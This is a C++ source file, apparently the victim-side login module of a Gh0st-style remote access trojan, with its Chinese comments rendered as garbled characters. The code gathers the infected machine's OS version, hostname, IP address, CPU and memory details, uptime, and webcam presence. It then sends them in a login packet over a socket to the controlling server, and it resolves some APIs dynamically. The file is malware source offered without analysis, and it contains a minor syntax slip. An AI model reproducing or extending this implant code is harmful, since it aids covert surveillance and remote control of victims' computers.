
#include <wininet.h>
#include <stdlib.h>
#include <vfw.h>
#include "until.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "vfw32.lib")
typedef VOID (WINAPI *GlobalMemoryStatusT)
(
 LPMEMORYSTATUS lpBuffer
 );



typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	WORD            CPUNums;        // CPU����
	int				CPUClockMhz;	// CPU��Ƶ
	int             MemorySize;     // �ڴ��С
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	bool			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	CHAR            szMark[100];    //���߱�ʶ
	char			RunTime[300];	// ����ʱ��
	//	int				nAnt;			//antiinfo
}LOGININFO;
// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;

	HMODULE mHodule = LoadLibrary("AVICAP32.dll");
	typedef BOOL (WINAPI *capGetDriverDescriptionT)(UINT,LPSTR,int,LPSTR,int);
	capGetDriverDescriptionT pcapGetDriverDescription=(capGetDriverDescriptionT)GetProcAddress(mHodule,"capGetDriverDescriptionA");

	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	FreeLibrary(mHodule);
	return bRet;
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szMakr)
{
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0; //û������ͷ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	
	strcpy(LoginInfo.szMark,szMakr);
	
	// ������
	char hostname[256]={NULL};
	DWORD hSize = 256;
	
	HKEY hkey;
	DWORD Operate = REG_CREATED_NEW_KEY;
	RegCreateKeyEx(HKEY_CURRENT_USER,"NetSubKey",NULL,NULL,NULL
		REG_OPTION_VOLATILE,KEY_QUERY_VALUE,NULL,&hkey,&Operate);

	DWORD lpType =  REG_SZ;
	if(RegQueryValueEx(hkey,"",NULL,&lpType,(LPBYTE)hostname,&hSize)==ERROR_SUCCESS)
		RegCloseKey(hkey);
	else

		GetComputerName(hostname,&hSize);

	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	SYSTEM_INFO siSysInfo; 
	::GetSystemInfo(&siSysInfo);   
	LoginInfo.CPUNums = siSysInfo.dwNumberOfProcessors;
	LoginInfo.CPUClockMhz = CPUClockMhz();
	
	MEMORYSTATUS mem;
	mem.dwLength=sizeof(mem);
GlobalMemoryStatusT pGlobalMemoryStatus= (GlobalMemoryStatusT)GetProcAddress(LoadLibrary("kernel32.dll"),"GlobalMemoryStatus");
	pGlobalMemoryStatus(&mem);
	LoginInfo.MemorySize = mem.dwTotalPhys/1024/1024+1;
	LoginInfo.bIsWebCam = IsWebCam();
	
	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	//  ����ʱ��
	long t=GetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	char time[300];
	wsprintf(day, "%d", t/86400000);
	t%=86400000;
	wsprintf(hour, "%d", t/3600000);
	t%=3600000;
	wsprintf(min, "%d", t/60000);
	wsprintf(LoginInfo.RunTime, "%s��%sСʱ%s����", day, hour, min);
	//wsprintf(LoginInfo.RunTime, "%s��", day, hour, min);

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));
	
	return nRet;
}
